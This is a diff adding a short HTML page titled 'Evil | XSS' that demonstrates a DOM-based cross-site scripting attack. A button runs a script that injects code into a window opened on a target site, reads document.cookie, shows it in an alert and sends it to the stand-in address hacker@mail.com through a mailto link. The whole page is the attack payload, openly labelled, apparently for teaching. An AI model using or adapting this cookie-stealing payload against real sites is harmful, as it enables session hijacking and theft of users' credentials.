@@ -1,0 +1,19 @@
+<html>
+  <head>
+	<title>Evil | XSS</title>
+    <script>
+		function doXSS() {	
+			window.open("http://good.com/index.html", 
+									"<script> \
+									x = document.cookie; \
+									alert('Stolen: '+ ' ' + x); \
+									window.open('mailto:hacker@mail.com?subject=victim hacked&body=INFO: ' + x); \
+									</scr" + "ipt>", "", false);
+		};
+	</script> 
+</head>
+  <body>
+	  <h1>XSS DOM Based</h1>	  
+			<button onclick="doXSS()">User entering evil site</button>
+	</body>
+</html>
